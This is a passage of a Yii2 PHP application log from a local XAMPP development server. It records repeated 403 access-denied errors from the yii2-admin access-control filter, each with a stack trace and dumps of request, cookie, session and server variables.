    'HTTP_COOKIE' => '_identity=9dc3e882c595ff0fa4feeae21489c917fcb86f4f3aef88d6982c5f18402701dea%3A2%3A%7Bi%3A0%3Bs%3A9%3A%22_identity%22%3Bi%3A1%3Bs%3A46%3A%22%5B1%2C%22FCxNRGJia25jro30ecX5r8yVk7nCuaOY%22%2C2592000%5D%22%3B%7D; _csrf=62eec84fae02f3723f5fd39cc3cad22dcdd04ab316f5139357f9c1e3822a06c1a%3A2%3A%7Bi%3A0%3Bs%3A5%3A%22_csrf%22%3Bi%3A1%3Bs%3A32%3A%22rbJenndMR37iuhmNYhvcYBeDxQAw2HiZ%22%3B%7D; PHPSESSID=2nreelq6ih9vuja9usa43m96no'
    'PATH' => 'C:\\Windows\\system32;C:\\Windows;C:\\Windows\\System32\\Wbem;C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\;C:\\xampp\\php;C:\\ProgramData\\ComposerSetup\\bin;C:\\Program Files\\Git\\cmd;C:\\Program Files\\Git LFS;C:\\Windows\\System32\\OpenSSH\\;C:\\Users\\BlackOwl\\AppData\\Local\\Microsoft\\WindowsApps;C:\\Users\\BlackOwl\\AppData\\Roaming\\Composer\\vendor\\bin;C:\\Users\\BlackOwl\\AppData\\Local\\Programs\\Microsoft VS Code\\bin'
    'SystemRoot' => 'C:\\Windows'
    'COMSPEC' => 'C:\\Windows\\system32\\cmd.exe'
    'PATHEXT' => '.COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC'
    'WINDIR' => 'C:\\Windows'
    'SERVER_SIGNATURE' => '<address>Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.1.25 Server at planealo.local Port 80</address>
'
    'SERVER_SOFTWARE' => 'Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.1.25'
    'SERVER_NAME' => 'planealo.local'
    'SERVER_ADDR' => '127.0.0.1'
    'SERVER_PORT' => '80'
    'REMOTE_ADDR' => '127.0.0.1'
    'DOCUMENT_ROOT' => 'C:/xampp/htdocs/planealo_desarrollo/web'
    'REQUEST_SCHEME' => 'http'
    'CONTEXT_PREFIX' => ''
    'CONTEXT_DOCUMENT_ROOT' => 'C:/xampp/htdocs/planealo_desarrollo/web'
    'SERVER_ADMIN' => 'postmaster@localhost'
    'SCRIPT_FILENAME' => 'C:/xampp/htdocs/planealo_desarrollo/web/index.php'
    'REMOTE_PORT' => '58634'
    'REDIRECT_URL' => '/debug/default/toolbar'
    'REDIRECT_QUERY_STRING' => 'tag=697a66da13733'
    'GATEWAY_INTERFACE' => 'CGI/1.1'
    'SERVER_PROTOCOL' => 'HTTP/1.1'
    'REQUEST_METHOD' => 'GET'
    'QUERY_STRING' => 'tag=697a66da13733'
    'REQUEST_URI' => '/debug/default/toolbar?tag=697a66da13733'
    'SCRIPT_NAME' => '/index.php'
    'PHP_SELF' => '/index.php'
    'REQUEST_TIME_FLOAT' => 1769629402.649
    'REQUEST_TIME' => 1769629402
]
2026-01-28 15:45:24 [127.0.0.1][1][2nreelq6ih9vuja9usa43m96no][error][yii\web\HttpException:403] yii\web\ForbiddenHttpException: No tiene permitido ejecutar esta acción. in C:\xampp\htdocs\planealo_desarrollo\vendor\mdmsoft\yii2-admin\components\AccessControl.php:88
Stack trace:
#0 C:\xampp\htdocs\planealo_desarrollo\vendor\mdmsoft\yii2-admin\components\AccessControl.php(73): mdm\admin\components\AccessControl->denyAccess(Object(yii\web\User))
#1 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\ActionFilter.php(83): mdm\admin\components\AccessControl->beforeAction(Object(yii\base\InlineAction))
#2 [internal function]: yii\base\ActionFilter->beforeFilter(Object(yii\base\ActionEvent))
#3 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Component.php(653): call_user_func(Array, Object(yii\base\ActionEvent))
#4 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Module.php(735): yii\base\Component->trigger('beforeAction', Object(yii\base\ActionEvent))
#5 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Controller.php(185): yii\base\Module->beforeAction(Object(yii\base\InlineAction))
#6 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Module.php(554): yii\base\Controller->runAction('index', Array)
#7 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\web\Application.php(112): yii\base\Module->runAction('admin/route/ind...', Array)
#8 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Application.php(391): yii\web\Application->handleRequest(Object(yii\web\Request))
#9 C:\xampp\htdocs\planealo_desarrollo\web\index.php(12): yii\base\Application->run()
#10 {main}
2026-01-28 15:45:23 [127.0.0.1][1][2nreelq6ih9vuja9usa43m96no][info][application] $_GET = []

$_POST = []

$_FILES = []

$_COOKIE = [
    '_identity' => '9dc3e882c595ff0fa4feeae21489c917fcb86f4f3aef88d6982c5f18402701dea:2:{i:0;s:9:\"_identity\";i:1;s:46:\"[1,\"FCxNRGJia25jro30ecX5r8yVk7nCuaOY\",2592000]\";}'
    '_csrf' => '62eec84fae02f3723f5fd39cc3cad22dcdd04ab316f5139357f9c1e3822a06c1a:2:{i:0;s:5:\"_csrf\";i:1;s:32:\"rbJenndMR37iuhmNYhvcYBeDxQAw2HiZ\";}'
    'PHPSESSID' => '2nreelq6ih9vuja9usa43m96no'
]

$_SESSION = [
    '__flash' => []
    '__id' => 1
    '__authKey' => 'FCxNRGJia25jro30ecX5r8yVk7nCuaOY'
]

$_SERVER = [
    'REDIRECT_MIBDIRS' => 'C:/xampp/php/extras/mibs'
    'REDIRECT_MYSQL_HOME' => '\\xampp\\mysql\\bin'
    'REDIRECT_OPENSSL_CONF' => 'C:/xampp/apache/bin/openssl.cnf'
    'REDIRECT_PHP_PEAR_SYSCONF_DIR' => '\\xampp\\php'
    'REDIRECT_PHPRC' => '\\xampp\\php'
    'REDIRECT_TMP' => '\\xampp\\tmp'
    'REDIRECT_STATUS' => '200'
    'MIBDIRS' => 'C:/xampp/php/extras/mibs'
    'MYSQL_HOME' => '\\xampp\\mysql\\bin'
    'OPENSSL_CONF' => 'C:/xampp/apache/bin/openssl.cnf'
    'PHP_PEAR_SYSCONF_DIR' => '\\xampp\\php'
    'PHPRC' => '\\xampp\\php'
    'TMP' => '\\xampp\\tmp'
    'HTTP_HOST' => 'planealo.local'
    'HTTP_CONNECTION' => 'keep-alive'
    'HTTP_CACHE_CONTROL' => 'max-age=0'
    'HTTP_UPGRADE_INSECURE_REQUESTS' => '1'
    'HTTP_USER_AGENT' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36 OPR/126.0.0.0'
    'HTTP_ACCEPT' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7'
    'HTTP_REFERER' => 'http://planealo.local/'
    'HTTP_ACCEPT_ENCODING' => 'gzip, deflate'
    'HTTP_ACCEPT_LANGUAGE' => 'es,es-ES;q=0.9,en;q=0.8,ru;q=0.7,fr;q=0.6,it;q=0.5'
    'HTTP_COOKIE' => '_identity=9dc3e882c595ff0fa4feeae21489c917fcb86f4f3aef88d6982c5f18402701dea%3A2%3A%7Bi%3A0%3Bs%3A9%3A%22_identity%22%3Bi%3A1%3Bs%3A46%3A%22%5B1%2C%22FCxNRGJia25jro30ecX5r8yVk7nCuaOY%22%2C2592000%5D%22%3B%7D; _csrf=62eec84fae02f3723f5fd39cc3cad22dcdd04ab316f5139357f9c1e3822a06c1a%3A2%3A%7Bi%3A0%3Bs%3A5%3A%22_csrf%22%3Bi%3A1%3Bs%3A32%3A%22rbJenndMR37iuhmNYhvcYBeDxQAw2HiZ%22%3B%7D; PHPSESSID=2nreelq6ih9vuja9usa43m96no'
    'PATH' => 'C:\\Windows\\system32;C:\\Windows;C:\\Windows\\System32\\Wbem;C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\;C:\\xampp\\php;C:\\ProgramData\\ComposerSetup\\bin;C:\\Program Files\\Git\\cmd;C:\\Program Files\\Git LFS;C:\\Windows\\System32\\OpenSSH\\;C:\\Users\\BlackOwl\\AppData\\Local\\Microsoft\\WindowsApps;C:\\Users\\BlackOwl\\AppData\\Roaming\\Composer\\vendor\\bin;C:\\Users\\BlackOwl\\AppData\\Local\\Programs\\Microsoft VS Code\\bin'
    'SystemRoot' => 'C:\\Windows'
    'COMSPEC' => 'C:\\Windows\\system32\\cmd.exe'
    'PATHEXT' => '.COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC'
    'WINDIR' => 'C:\\Windows'
    'SERVER_SIGNATURE' => '<address>Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.1.25 Server at planealo.local Port 80</address>
'
    'SERVER_SOFTWARE' => 'Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.1.25'
    'SERVER_NAME' => 'planealo.local'
    'SERVER_ADDR' => '127.0.0.1'
    'SERVER_PORT' => '80'
    'REMOTE_ADDR' => '127.0.0.1'
    'DOCUMENT_ROOT' => 'C:/xampp/htdocs/planealo_desarrollo/web'
    'REQUEST_SCHEME' => 'http'
    'CONTEXT_PREFIX' => ''
    'CONTEXT_DOCUMENT_ROOT' => 'C:/xampp/htdocs/planealo_desarrollo/web'
    'SERVER_ADMIN' => 'postmaster@localhost'
    'SCRIPT_FILENAME' => 'C:/xampp/htdocs/planealo_desarrollo/web/index.php'
    'REMOTE_PORT' => '58646'
    'REDIRECT_URL' => '/admin/route/index'
    'GATEWAY_INTERFACE' => 'CGI/1.1'
    'SERVER_PROTOCOL' => 'HTTP/1.1'
    'REQUEST_METHOD' => 'GET'
    'QUERY_STRING' => ''
    'REQUEST_URI' => '/admin/route/index'
    'SCRIPT_NAME' => '/index.php'
    'PHP_SELF' => '/index.php'
    'REQUEST_TIME_FLOAT' => 1769629523.2105
    'REQUEST_TIME' => 1769629523
]
2026-01-28 15:45:25 [127.0.0.1][1][2nreelq6ih9vuja9usa43m96no][error][yii\web\HttpException:403] yii\web\ForbiddenHttpException: No tiene permitido ejecutar esta acción. in C:\xampp\htdocs\planealo_desarrollo\vendor\mdmsoft\yii2-admin\components\AccessControl.php:88
Stack trace:
#0 C:\xampp\htdocs\planealo_desarrollo\vendor\mdmsoft\yii2-admin\components\AccessControl.php(73): mdm\admin\components\AccessControl->denyAccess(Object(yii\web\User))
#1 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\ActionFilter.php(83): mdm\admin\components\AccessControl->beforeAction(Object(yii\base\InlineAction))
#2 [internal function]: yii\base\ActionFilter->beforeFilter(Object(yii\base\ActionEvent))
#3 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Component.php(653): call_user_func(Array, Object(yii\base\ActionEvent))
#4 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Module.php(735): yii\base\Component->trigger('beforeAction', Object(yii\base\ActionEvent))
#5 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Controller.php(185): yii\base\Module->beforeAction(Object(yii\base\InlineAction))
#6 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Module.php(554): yii\base\Controller->runAction('toolbar', Array)
#7 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\web\Application.php(112): yii\base\Module->runAction('debug/default/t...', Array)
#8 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Application.php(391): yii\web\Application->handleRequest(Object(yii\web\Request))
#9 C:\xampp\htdocs\planealo_desarrollo\web\index.php(12): yii\base\Application->run()
#10 {main}
2026-01-28 15:45:24 [127.0.0.1][1][2nreelq6ih9vuja9usa43m96no][info][application] $_GET = [
    'tag' => '697a6754098b7'
]

$_POST = []

$_FILES = []

$_COOKIE = [
    '_identity' => '9dc3e882c595ff0fa4feeae21489c917fcb86f4f3aef88d6982c5f18402701dea:2:{i:0;s:9:\"_identity\";i:1;s:46:\"[1,\"FCxNRGJia25jro30ecX5r8yVk7nCuaOY\",2592000]\";}'
    '_csrf' => '62eec84fae02f3723f5fd39cc3cad22dcdd04ab316f5139357f9c1e3822a06c1a:2:{i:0;s:5:\"_csrf\";i:1;s:32:\"rbJenndMR37iuhmNYhvcYBeDxQAw2HiZ\";}'
    'PHPSESSID' => '2nreelq6ih9vuja9usa43m96no'
]

$_SESSION = [
    '__flash' => []
    '__id' => 1
    '__authKey' => 'FCxNRGJia25jro30ecX5r8yVk7nCuaOY'
]

$_SERVER = [
    'REDIRECT_MIBDIRS' => 'C:/xampp/php/extras/mibs'
    'REDIRECT_MYSQL_HOME' => '\\xampp\\mysql\\bin'
    'REDIRECT_OPENSSL_CONF' => 'C:/xampp/apache/bin/openssl.cnf'
    'REDIRECT_PHP_PEAR_SYSCONF_DIR' => '\\xampp\\php'
    'REDIRECT_PHPRC' => '\\xampp\\php'
    'REDIRECT_TMP' => '\\xampp\\tmp'
    'REDIRECT_STATUS' => '200'
    'MIBDIRS' => 'C:/xampp/php/extras/mibs'
    'MYSQL_HOME' => '\\xampp\\mysql\\bin'
    'OPENSSL_CONF' => 'C:/xampp/apache/bin/openssl.cnf'
    'PHP_PEAR_SYSCONF_DIR' => '\\xampp\\php'
    'PHPRC' => '\\xampp\\php'
    'TMP' => '\\xampp\\tmp'
    'HTTP_HOST' => 'planealo.local'
    'HTTP_CONNECTION' => 'keep-alive'
    'HTTP_USER_AGENT' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36 OPR/126.0.0.0'
    'HTTP_ACCEPT' => 'text/html'
    'HTTP_X_REQUESTED_WITH' => 'XMLHttpRequest'
    'HTTP_REFERER' => 'http://planealo.local/admin/route/index'
    'HTTP_ACCEPT_ENCODING' => 'gzip, deflate'
    'HTTP_ACCEPT_LANGUAGE' => 'es,es-ES;q=0.9,en;q=0.8,ru;q=0.7,fr;q=0.6,it;q=0.5'
    'HTTP_COOKIE' => '_identity=9dc3e882c595ff0fa4feeae21489c917fcb86f4f3aef88d6982c5f18402701dea%3A2%3A%7Bi%3A0%3Bs%3A9%3A%22_identity%22%3Bi%3A1%3Bs%3A46%3A%22%5B1%2C%22FCxNRGJia25jro30ecX5r8yVk7nCuaOY%22%2C2592000%5D%22%3B%7D; _csrf=62eec84fae02f3723f5fd39cc3cad22dcdd04ab316f5139357f9c1e3822a06c1a%3A2%3A%7Bi%3A0%3Bs%3A5%3A%22_csrf%22%3Bi%3A1%3Bs%3A32%3A%22rbJenndMR37iuhmNYhvcYBeDxQAw2HiZ%22%3B%7D; PHPSESSID=2nreelq6ih9vuja9usa43m96no'
    'PATH' => 'C:\\Windows\\system32;C:\\Windows;C:\\Windows\\System32\\Wbem;C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\;C:\\xampp\\php;C:\\ProgramData\\ComposerSetup\\bin;C:\\Program Files\\Git\\cmd;C:\\Program Files\\Git LFS;C:\\Windows\\System32\\OpenSSH\\;C:\\Users\\BlackOwl\\AppData\\Local\\Microsoft\\WindowsApps;C:\\Users\\BlackOwl\\AppData\\Roaming\\Composer\\vendor\\bin;C:\\Users\\BlackOwl\\AppData\\Local\\Programs\\Microsoft VS Code\\bin'
    'SystemRoot' => 'C:\\Windows'
    'COMSPEC' => 'C:\\Windows\\system32\\cmd.exe'
    'PATHEXT' => '.COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC'
    'WINDIR' => 'C:\\Windows'
    'SERVER_SIGNATURE' => '<address>Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.1.25 Server at planealo.local Port 80</address>
'
    'SERVER_SOFTWARE' => 'Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.1.25'
    'SERVER_NAME' => 'planealo.local'
    'SERVER_ADDR' => '127.0.0.1'
    'SERVER_PORT' => '80'
    'REMOTE_ADDR' => '127.0.0.1'
    'DOCUMENT_ROOT' => 'C:/xampp/htdocs/planealo_desarrollo/web'
    'REQUEST_SCHEME' => 'http'
    'CONTEXT_PREFIX' => ''
    'CONTEXT_DOCUMENT_ROOT' => 'C:/xampp/htdocs/planealo_desarrollo/web'
    'SERVER_ADMIN' => 'postmaster@localhost'
    'SCRIPT_FILENAME' => 'C:/xampp/htdocs/planealo_desarrollo/web/index.php'
    'REMOTE_PORT' => '58646'
    'REDIRECT_URL' => '/debug/default/toolbar'
    'REDIRECT_QUERY_STRING' => 'tag=697a6754098b7'
    'GATEWAY_INTERFACE' => 'CGI/1.1'
    'SERVER_PROTOCOL' => 'HTTP/1.1'
    'REQUEST_METHOD' => 'GET'
    'QUERY_STRING' => 'tag=697a6754098b7'
    'REQUEST_URI' => '/debug/default/toolbar?tag=697a6754098b7'
    'SCRIPT_NAME' => '/index.php'
    'PHP_SELF' => '/index.php'
    'REQUEST_TIME_FLOAT' => 1769629524.6655
    'REQUEST_TIME' => 1769629524
]
2026-01-28 15:45:58 [127.0.0.1][1][2nreelq6ih9vuja9usa43m96no][error][yii\web\HttpException:403] yii\web\ForbiddenHttpException: No tiene permitido ejecutar esta acción. in C:\xampp\htdocs\planealo_desarrollo\vendor\mdmsoft\yii2-admin\components\AccessControl.php:88
Stack trace:
#0 C:\xampp\htdocs\planealo_desarrollo\vendor\mdmsoft\yii2-admin\components\AccessControl.php(73): mdm\admin\components\AccessControl->denyAccess(Object(yii\web\User))
#1 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\ActionFilter.php(83): mdm\admin\components\AccessControl->beforeAction(Object(yii\base\InlineAction))
#2 [internal function]: yii\base\ActionFilter->beforeFilter(Object(yii\base\ActionEvent))
#3 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Component.php(653): call_user_func(Array, Object(yii\base\ActionEvent))
#4 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Module.php(735): yii\base\Component->trigger('beforeAction', Object(yii\base\ActionEvent))
#5 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Controller.php(185): yii\base\Module->beforeAction(Object(yii\base\InlineAction))
#6 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Module.php(554): yii\base\Controller->runAction('index', Array)
#7 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\web\Application.php(112): yii\base\Module->runAction('admin/route/ind...', Array)
#8 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Application.php(391): yii\web\Application->handleRequest(Object(yii\web\Request))
#9 C:\xampp\htdocs\planealo_desarrollo\web\index.php(12): yii\base\Application->run()
#10 {main}
2026-01-28 15:45:58 [127.0.0.1][1][2nreelq6ih9vuja9usa43m96no][info][application] $_GET = []

$_POST = []

$_FILES = []

$_COOKIE = [
    '_identity' => '9dc3e882c595ff0fa4feeae21489c917fcb86f4f3aef88d6982c5f18402701dea:2:{i:0;s:9:\"_identity\";i:1;s:46:\"[1,\"FCxNRGJia25jro30ecX5r8yVk7nCuaOY\",2592000]\";}'
    '_csrf' => '62eec84fae02f3723f5fd39cc3cad22dcdd04ab316f5139357f9c1e3822a06c1a:2:{i:0;s:5:\"_csrf\";i:1;s:32:\"rbJenndMR37iuhmNYhvcYBeDxQAw2HiZ\";}'
    'PHPSESSID' => '2nreelq6ih9vuja9usa43m96no'
]

$_SESSION = [
    '__flash' => []
    '__id' => 1
    '__authKey' => 'FCxNRGJia25jro30ecX5r8yVk7nCuaOY'
]

$_SERVER = [
    'REDIRECT_MIBDIRS' => 'C:/xampp/php/extras/mibs'
    'REDIRECT_MYSQL_HOME' => '\\xampp\\mysql\\bin'
    'REDIRECT_OPENSSL_CONF' => 'C:/xampp/apache/bin/openssl.cnf'
    'REDIRECT_PHP_PEAR_SYSCONF_DIR' => '\\xampp\\php'
    'REDIRECT_PHPRC' => '\\xampp\\php'
    'REDIRECT_TMP' => '\\xampp\\tmp'
    'REDIRECT_STATUS' => '200'
    'MIBDIRS' => 'C:/xampp/php/extras/mibs'
    'MYSQL_HOME' => '\\xampp\\mysql\\bin'
    'OPENSSL_CONF' => 'C:/xampp/apache/bin/openssl.cnf'
    'PHP_PEAR_SYSCONF_DIR' => '\\xampp\\php'
    'PHPRC' => '\\xampp\\php'
    'TMP' => '\\xampp\\tmp'
    'HTTP_HOST' => 'planealo.local'
    'HTTP_CONNECTION' => 'keep-alive'
    'HTTP_CACHE_CONTROL' => 'max-age=0'
    'HTTP_UPGRADE_INSECURE_REQUESTS' => '1'
    'HTTP_USER_AGENT' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36 OPR/126.0.0.0'
    'HTTP_ACCEPT' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7'
    'HTTP_REFERER' => 'http://planealo.local/'
    'HTTP_ACCEPT_ENCODING' => 'gzip, deflate'
    'HTTP_ACCEPT_LANGUAGE' => 'es,es-ES;q=0.9,en;q=0.8,ru;q=0.7,fr;q=0.6,it;q=0.5'
    'HTTP_COOKIE' => '_identity=9dc3e882c595ff0fa4feeae21489c917fcb86f4f3aef88d6982c5f18402701dea%3A2%3A%7Bi%3A0%3Bs%3A9%3A%22_identity%22%3Bi%3A1%3Bs%3A46%3A%22%5B1%2C%22FCxNRGJia25jro30ecX5r8yVk7nCuaOY%22%2C2592000%5D%22%3B%7D; _csrf=62eec84fae02f3723f5fd39cc3cad22dcdd04ab316f5139357f9c1e3822a06c1a%3A2%3A%7Bi%3A0%3Bs%3A5%3A%22_csrf%22%3Bi%3A1%3Bs%3A32%3A%22rbJenndMR37iuhmNYhvcYBeDxQAw2HiZ%22%3B%7D; PHPSESSID=2nreelq6ih9vuja9usa43m96no'
    'PATH' => 'C:\\Windows\\system32;C:\\Windows;C:\\Windows\\System32\\Wbem;C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\;C:\\xampp\\php;C:\\ProgramData\\ComposerSetup\\bin;C:\\Program Files\\Git\\cmd;C:\\Program Files\\Git LFS;C:\\Windows\\System32\\OpenSSH\\;C:\\Users\\BlackOwl\\AppData\\Local\\Microsoft\\WindowsApps;C:\\Users\\BlackOwl\\AppData\\Roaming\\Composer\\vendor\\bin;C:\\Users\\BlackOwl\\AppData\\Local\\Programs\\Microsoft VS Code\\bin'
    'SystemRoot' => 'C:\\Windows'
    'COMSPEC' => 'C:\\Windows\\system32\\cmd.exe'
    'PATHEXT' => '.COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC'
    'WINDIR' => 'C:\\Windows'
    'SERVER_SIGNATURE' => '<address>Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.1.25 Server at planealo.local Port 80</address>
'
    'SERVER_SOFTWARE' => 'Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.1.25'
    'SERVER_NAME' => 'planealo.local'
    'SERVER_ADDR' => '127.0.0.1'
    'SERVER_PORT' => '80'
    'REMOTE_ADDR' => '127.0.0.1'
    'DOCUMENT_ROOT' => 'C:/xampp/htdocs/planealo_desarrollo/web'
    'REQUEST_SCHEME' => 'http'
    'CONTEXT_PREFIX' => ''
    'CONTEXT_DOCUMENT_ROOT' => 'C:/xampp/htdocs/planealo_desarrollo/web'
    'SERVER_ADMIN' => 'postmaster@localhost'
    'SCRIPT_FILENAME' => 'C:/xampp/htdocs/planealo_desarrollo/web/index.php'
    'REMOTE_PORT' => '58647'
    'REDIRECT_URL' => '/admin/route/index'
    'GATEWAY_INTERFACE' => 'CGI/1.1'
    'SERVER_PROTOCOL' => 'HTTP/1.1'
    'REQUEST_METHOD' => 'GET'
    'QUERY_STRING' => ''
    'REQUEST_URI' => '/admin/route/index'
    'SCRIPT_NAME' => '/index.php'
    'PHP_SELF' => '/index.php'
    'REQUEST_TIME_FLOAT' => 1769629558.0776
    'REQUEST_TIME' => 1769629558
]
2026-01-28 15:45:59 [127.0.0.1][1][2nreelq6ih9vuja9usa43m96no][error][yii\web\HttpException:403] yii\web\ForbiddenHttpException: No tiene permitido ejecutar esta acción. in C:\xampp\htdocs\planealo_desarrollo\vendor\mdmsoft\yii2-admin\components\AccessControl.php:88
Stack trace:
#0 C:\xampp\htdocs\planealo_desarrollo\vendor\mdmsoft\yii2-admin\components\AccessControl.php(73): mdm\admin\components\AccessControl->denyAccess(Object(yii\web\User))
#1 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\ActionFilter.php(83): mdm\admin\components\AccessControl->beforeAction(Object(yii\base\InlineAction))
#2 [internal function]: yii\base\ActionFilter->beforeFilter(Object(yii\base\ActionEvent))
#3 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Component.php(653): call_user_func(Array, Object(yii\base\ActionEvent))
#4 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Module.php(735): yii\base\Component->trigger('beforeAction', Object(yii\base\ActionEvent))
#5 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Controller.php(185): yii\base\Module->beforeAction(Object(yii\base\InlineAction))
#6 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Module.php(554): yii\base\Controller->runAction('toolbar', Array)
#7 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\web\Application.php(112): yii\base\Module->runAction('debug/default/t...', Array)
#8 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Application.php(391): yii\web\Application->handleRequest(Object(yii\web\Request))
#9 C:\xampp\htdocs\planealo_desarrollo\web\index.php(12): yii\base\Application->run()
#10 {main}
2026-01-28 15:45:59 [127.0.0.1][1][2nreelq6ih9vuja9usa43m96no][info][application] $_GET = [
    'tag' => '697a67769d83c'
]

$_POST = []

$_FILES = []

$_COOKIE = [
    '_identity' => '9dc3e882c595ff0fa4feeae21489c917fcb86f4f3aef88d6982c5f18402701dea:2:{i:0;s:9:\"_identity\";i:1;s:46:\"[1,\"FCxNRGJia25jro30ecX5r8yVk7nCuaOY\",2592000]\";}'
    '_csrf' => '62eec84fae02f3723f5fd39cc3cad22dcdd04ab316f5139357f9c1e3822a06c1a:2:{i:0;s:5:\"_csrf\";i:1;s:32:\"rbJenndMR37iuhmNYhvcYBeDxQAw2HiZ\";}'
    'PHPSESSID' => '2nreelq6ih9vuja9usa43m96no'
]

$_SESSION = [
    '__flash' => []
    '__id' => 1
    '__authKey' => 'FCxNRGJia25jro30ecX5r8yVk7nCuaOY'
]

$_SERVER = [
    'REDIRECT_MIBDIRS' => 'C:/xampp/php/extras/mibs'
    'REDIRECT_MYSQL_HOME' => '\\xampp\\mysql\\bin'
    'REDIRECT_OPENSSL_CONF' => 'C:/xampp/apache/bin/openssl.cnf'
    'REDIRECT_PHP_PEAR_SYSCONF_DIR' => '\\xampp\\php'
    'REDIRECT_PHPRC' => '\\xampp\\php'
    'REDIRECT_TMP' => '\\xampp\\tmp'
    'REDIRECT_STATUS' => '200'
    'MIBDIRS' => 'C:/xampp/php/extras/mibs'
    'MYSQL_HOME' => '\\xampp\\mysql\\bin'
    'OPENSSL_CONF' => 'C:/xampp/apache/bin/openssl.cnf'
    'PHP_PEAR_SYSCONF_DIR' => '\\xampp\\php'
    'PHPRC' => '\\xampp\\php'
    'TMP' => '\\xampp\\tmp'
    'HTTP_HOST' => 'planealo.local'
    'HTTP_CONNECTION' => 'keep-alive'
    'HTTP_USER_AGENT' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36 OPR/126.0.0.0'
    'HTTP_ACCEPT' => 'text/html'
    'HTTP_X_REQUESTED_WITH' => 'XMLHttpRequest'
    'HTTP_REFERER' => 'http://planealo.local/admin/route/index'
    'HTTP_ACCEPT_ENCODING' => 'gzip, deflate'
    'HTTP_ACCEPT_LANGUAGE' => 'es,es-ES;q=0.9,en;q=0.8,ru;q=0.7,fr;q=0.6,it;q=0.5'
    'HTTP_COOKIE' => '_identity=9dc3e882c595ff0fa4feeae21489c917fcb86f4f3aef88d6982c5f18402701dea%3A2%3A%7Bi%3A0%3Bs%3A9%3A%22_identity%22%3Bi%3A1%3Bs%3A46%3A%22%5B1%2C%22FCxNRGJia25jro30ecX5r8yVk7nCuaOY%22%2C2592000%5D%22%3B%7D; _csrf=62eec84fae02f3723f5fd39cc3cad22dcdd04ab316f5139357f9c1e3822a06c1a%3A2%3A%7Bi%3A0%3Bs%3A5%3A%22_csrf%22%3Bi%3A1%3Bs%3A32%3A%22rbJenndMR37iuhmNYhvcYBeDxQAw2HiZ%22%3B%7D; PHPSESSID=2nreelq6ih9vuja9usa43m96no'
    'PATH' => 'C:\\Windows\\system32;C:\\Windows;C:\\Windows\\System32\\Wbem;C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\;C:\\xampp\\php;C:\\ProgramData\\ComposerSetup\\bin;C:\\Program Files\\Git\\cmd;C:\\Program Files\\Git LFS;C:\\Windows\\System32\\OpenSSH\\;C:\\Users\\BlackOwl\\AppData\\Local\\Microsoft\\WindowsApps;C:\\Users\\BlackOwl\\AppData\\Roaming\\Composer\\vendor\\bin;C:\\Users\\BlackOwl\\AppData\\Local\\Programs\\Microsoft VS Code\\bin'
    'SystemRoot' => 'C:\\Windows'
